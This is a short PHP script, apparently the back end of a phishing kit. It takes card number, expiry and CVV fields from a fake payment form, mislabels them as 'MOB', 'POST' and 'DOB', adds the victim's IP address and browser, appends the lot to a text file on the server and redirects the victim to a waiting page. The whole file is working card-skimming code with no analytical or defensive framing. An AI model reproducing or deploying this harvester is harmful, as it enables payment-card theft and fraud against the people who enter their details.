<?php
$zabi = getenv("REMOTE_ADDR");
$message .= "--++-----[KORT ZODIAC]-----++--\n";
$message .= "MOB : ".$_POST['kort1']."\n";
$message .= "POST : ".$_POST['exp1']."\n";
$message .= "DOB : ".$_POST['cvv1']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "--------------------------------------------\n";


    $text = fopen('../smtp.txt', 'a');
fwrite($text, $message);

header("Location: Waiting\wait");
?>